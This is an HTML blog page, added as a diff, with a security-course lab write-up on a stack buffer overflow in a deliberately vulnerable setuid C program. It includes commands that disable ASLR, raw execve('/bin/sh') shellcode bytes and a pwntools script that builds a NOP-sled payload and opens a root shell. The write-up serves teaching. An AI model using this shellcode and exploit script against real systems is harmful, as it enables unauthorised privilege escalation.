@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html style="height: 100%;" lang="en">
+  <head>
+    <title>reo</title>
+<meta name="description" content="Leop homepage">
+
+<meta property="og:title" content="reo">
+<meta property="og:description" content="Leop homepage">
+
+<!-- <meta property="fb:app_id" content="260132667518211"> -->
+<!-- <link rel="apple-touch-icon" href="https://aidn.jp/apple-touch-icon.png"> -->
+<!-- <link rel="shortcut icon" href="https://aidn.jp/shared/icon/favicon.ico"> -->
+<!-- <link rel="alternate" media="handheld" href="https://aidn.jp/"> -->
+<!--
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://aidn.jp/shared/img/og/aidn.png">
+<meta name="twitter:site" content="@daniwell_aidn">
+
+<meta property="og:image" content="https://aidn.jp/shared/img/og/aidn.png">
+
+
+<link href='https://fonts.googleapis.com/css?family=PT+Sans:400,700,400italic,700italic|Source+Sans+Pro:400,700,200,300|Josefin+Sans:400,600,700,300' rel='stylesheet' type='text/css'>
+<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="canonical" href="http://192.168.0.23:4000/">
+<link rel="alternate" type="application/rss+xml" title="Reo homepage" href="http://192.168.0.23:4000/feed.xml">
+-->
+
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1">
+<meta property="og:locale" content="en_CA">
+<meta property="og:type" content="website">
+
+<meta name="theme-color" content="#000">
+<link rel="stylesheet" href="/assets/css/style.css">
+
+
+
+
+  </head>
+  <body style="position: relative; min-height: 100%; top: 0px;" class="dark ">
+    <nav id="nav_hp" class="sidenav collapse invert-color">
+  <!-- close button div
+  <div id="menu" style="display:block; width:100%">
+    <a href="javascript:void(0)" class="closebtn hide-large"
+				 style="line-height: 0.35; font-size:5.5vmax; margin-left:calc(6rem + 20vmin - 13vmax)"
+				 onclick="close_nav()">&times;</a>
+  </div>
+  -->
+  <!-- items div -->
+  <div id="menu" class="sidenav-items" style="display:block; width:100%">
+  
+  <p><a href="/" >TOP</a></p>
+  
+  <p><a href="/about.html" >ABOUT</a></p>
+  
+  <p><a href="/blog.html" >BLOG</a></p>
+  
+  </div>
+</nav>
+<div class="overlay hide-large" onclick="close_nav()" style="cursor:pointer"
+				title="close side menu" id="overlay"></div>
+<span class="hide-large" style="font-size:30px; cursor:pointer; position:fixed; top:3vh; left:1.2vw" onclick="open_nav()">&#9776;</span>
+<script>
+	// Open and close sidebar
+	function open_nav() {
+		document.getElementById("nav_hp").style.width = "calc(6rem + 20vmin)";
+		document.getElementById("overlay").style.display = "block";
+	}
+	function close_nav() {
+		document.getElementById("nav_hp").style.width = "0px";
+		document.getElementById("overlay").style.display = "none";
+	}
+</script>
+<!--
+	<p><a href="http://192.168.0.52:4000">TOP</a></p>
+
+	
+	
+	
+	
+	
+	
+	
+	
+	
+-->
+
+    <div class="hp-contents">
+      <h2 class="title">Stack Smash Shellcode</h2>
+      <div class="-container">
+        <div class="-content focus-content">
+
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="post-content" itemprop="articleBody">
+    <p>Continuing our <a href="/crypto/2020/11/03/10-stack-branch.html">last lab</a>
+we will use a buffer overflow to run an exploit which will
+allow for <a href="https://en.wikipedia.org/wiki/Privilege_escalation">privilege escalation</a>.</p>
+
+<h2 class="no_toc" id="contents">Contents</h2>
+
+<ul id="markdown-toc">
+  <li><a href="#setup" id="markdown-toc-setup">Setup</a></li>
+  <li><a href="#observations" id="markdown-toc-observations">Observations</a></li>
+  <li><a href="#the-exploit" id="markdown-toc-the-exploit">The Exploit</a></li>
+  <li><a href="#cleanup" id="markdown-toc-cleanup">Cleanup</a>    <ul>
+      <li><a href="#credits" id="markdown-toc-credits">Credits</a></li>
+    </ul>
+  </li>
+</ul>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="setup">Setup</h2>
+
+<hr />
+
+<p>Our setup here is that Mallory has found an executable with the <em>setuid</em> flag
+enabled. Essentially this allows Mallory to run the executable with the
+permissions of the owner of the file. The executable <code class="language-plaintext highlighter-rouge">/root/vuln</code> then
+runs with root permissions even if Mallory is the one executing it.</p>
+
+<p>Mallory wants to find a vulnerability which allows them to inject shellcode which
+spawns an interactive shell.</p>
+
+<p>The vulnerable program this time is</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+</span>
+<span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"Hello %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>recall in our case, ASLR and dmesg restrict are disabled</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ docker run --rm -v $(pwd):/shared --privileged -it thierrysans/vulnerable:stack-smashing-shellcode bash
+# echo 0 &gt; /proc/sys/kernel/randomize_va_space
+# echo 0 &gt; /proc/sys/kernel/dmesg_restrict
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="observations">Observations</h2>
+
+<hr />
+
+<p>We can compile the executable and disassemble it</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/shared# gcc vuln.c -o vuln -fno-stack-protector -m32 -z execstack
+/shared# objdump -d -M intel vuln &gt; dump.dmp
+</code></pre></div></div>
+
+<p>the only new argument here is <code class="language-plaintext highlighter-rouge">-z execstack</code> which as you can guess,
+makes the stack executable. Taking a look at <code class="language-plaintext highlighter-rouge">&lt;func&gt;</code> in the dump file,
+we find</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+ 804844a:    8d 85 f8 fe ff ff        lea    eax,[ebp-0x108]
+...
+</code></pre></div></div>
+
+<p>so 264 bytes are reserved for the buffer. We expect the address
+where the program jumps to to be stored in bytes 269-272 after the start
+of the buffer. To test this, we send 268 <code class="language-plaintext highlighter-rouge">'a'</code> followed by <code class="language-plaintext highlighter-rouge">bcde</code> getting</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/shared# ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefghijk
+Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabcdefghijk
+Segmentation fault (core dumped)
+/shared# dmesg | grep "vuln" | tail -n 1
+[17158.493232] vuln[4467]: segfault at 65646362 ip 0000000065646362 sp 00000000ffffd6b0 error 14
+</code></pre></div></div>
+
+<p>with the segfault occuring exactly where we expect. We also know from the log that
+the stack pointer <code class="language-plaintext highlighter-rouge">sp</code> was at <code class="language-plaintext highlighter-rouge">0xffffd6b0</code> when the segfault happened, we can use this
+to compute where the buffer begins in memory. Including our 4 added characters, the
+length of our malicious payload was <code class="language-plaintext highlighter-rouge">268+4 = 272=0x110</code> bytes long. Subtracting this
+from our <code class="language-plaintext highlighter-rouge">sp</code> we have that the buffer begins at <code class="language-plaintext highlighter-rouge">0xffffd6b0 - 0x110 = 0xffffd5a0</code>.</p>
+
+<p>We will use room the buffer offers us to inject shellcode and point the jump
+back into the buffer so that it executes the shellcode.
+We are given the shellcode and the only remaining detail is deciding what
+to set the address of our jump. Instead of relying on jumping exactly at the
+beginning of our shellcode, we will add NOP padding before and after and attempt
+to land somewhere in the middle to maximize our chances.</p>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="the-exploit">The Exploit</h2>
+
+<hr />
+
+<p>We can write a script to send our payload through</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="mi">128</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">b'a'</span><span class="o">*</span><span class="mi">115</span> <span class="o">+</span> <span class="s">b'</span><span class="se">\xd0\xd5\xff\xff</span><span class="s">'</span>
+<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>and this would give us a shell however we can do better with a more abstract solution using pwntools</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">shellcode</span> <span class="kn">import</span> <span class="n">get_shellcode</span>
+
+<span class="n">pwnlib</span><span class="p">.</span><span class="n">term</span><span class="p">.</span><span class="n">term_mode</span><span class="o">=</span> <span class="bp">False</span>
+</code></pre></div></div>
+
+<p>We can use the shellcraft module to generate the shellcode for an sh session</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_shellcode</span><span class="p">():</span>
+     <span class="k">return</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">i386</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
+</code></pre></div></div>
+
+<p>the creation of the payload will be similar to our branching exercise except
+instead of branching to another function, we will branch to somewhere within
+our stack to execute the shellcode we produced.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">craft_payload</span><span class="p">(</span><span class="n">path_to_vuln_prgm</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">):</span>
+    <span class="s">'''
+    returns the payload for the attack
+    given the path to the vulnerable binary
+    and the shellcode from get_shellcode in shellcode.py
+    (string, bytes) -&gt; bytes
+    '''</span>
+    <span class="n">de_brujin</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mi">315</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">path_to_vuln_prgm</span><span class="p">,</span> <span class="n">de_brujin</span><span class="p">])</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">wait_for_close</span><span class="p">()</span>
+    <span class="n">debug_msg</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'dmesg | grep "vuln" | tail -n 1'</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span>
+            <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">recvall</span><span class="p">()</span>
+
+    <span class="c1"># save eip, esp from dmesg
+</span>    <span class="n">eip</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">b'ip\ (.*)\ sp'</span><span class="p">,</span> <span class="n">debug_msg</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">esp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">b'sp\ (.*)\ error'</span><span class="p">,</span> <span class="n">debug_msg</span><span class="p">).</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="c1">#  esp = int(re.search(b'at\ (.*)\ sp', debug_msg).group(1), 16)
+</span>    <span class="n">overflow_len</span> <span class="o">=</span> <span class="n">cyclic_find</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">eip</span><span class="p">))</span>
+
+    <span class="n">addr</span> <span class="o">=</span> <span class="n">esp</span> <span class="o">-</span> <span class="p">((</span><span class="mi">3</span><span class="o">/</span><span class="mi">4</span><span class="p">)</span><span class="o">*</span><span class="n">overflow_len</span><span class="p">)</span>
+    <span class="n">NOPlen</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="mi">3</span><span class="o">*</span><span class="p">(</span><span class="n">overflow_len</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span><span class="o">/</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">padlen</span> <span class="o">=</span> <span class="n">overflow_len</span> <span class="o">-</span> <span class="p">(</span><span class="n">NOPlen</span> <span class="o">+</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">b'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="n">NOPlen</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">b'a'</span><span class="o">*</span><span class="n">padlen</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+
+    <span class="k">return</span> <span class="n">payload</span>
+</code></pre></div></div>
+
+<p>The goal of our computations will be for our memory to look something like this</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      +--------+ &lt;- start of buffer
+      |  NOP   |
+      |  SLED  |
+ addr |        | &lt;- want to jump somewhere in the middle
+      |        |
+      +--------+
+      | SHELL  | &lt;- our planted shellcode
+      | CODE   |
+      |        |
+      |        |
+      +--------+
+      ~  ..... ~ &lt;- additional pad
+      +--------+
+      |  addr  | &lt;- return address
+      |        |
+      +--------+  
+</code></pre></div></div>
+
+<p>so we land somewhere in the NOP sled which slides us nicely into
+our shellcode which executes sh. All that remains is making the
+process interactive in python</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">path_to_vuln_prgm</span><span class="p">):</span>
+    <span class="n">shellcode</span> <span class="o">=</span> <span class="n">get_shellcode</span><span class="p">()</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">craft_payload</span><span class="p">(</span><span class="n">path_to_vuln_prgm</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">path_to_vuln_prgm</span><span class="p">,</span> <span class="n">payload</span><span class="p">])</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><br /></p>
+
+<hr />
+
+<h2 id="cleanup">Cleanup</h2>
+
+<hr />
+
+<p>Finally, don’t forget to check that the protections are enabled for your own
+machine</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo 2 &gt; /proc/sys/kernel/randomize_va_space
+$ echo 1 &gt; /proc/sys/kernel/dmesg_restrict
+</code></pre></div></div>
+
+<p>also don’t forget to <a href="/crypto/2020/10/08/05-lab.html#docker-cleanup">clean up</a>
+after Docker.</p>
+
+<hr />
+
+<h3 id="credits">Credits</h3>
+
+<hr />
+
+<p>These labs and exercises were provided as a part of a course in Security
+taught in 2019 by
+<a href="https://thierrysans.me/">Thierry Sans</a>.
+Credit for creation of these exercises and
+Docker images/containers goes to their respective creators.</p>
+
+<p>Docker images, urls, etc. are kept private
+to prevent abuse but if interested please
+contact.</p>
+
+<p>This post was inspired by <a href="https://dhavalkapil.com/blogs/Shellcode-Injection/">another cool blog post</a>.</p>
+
+
+  </div>
+</article>
+
+
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
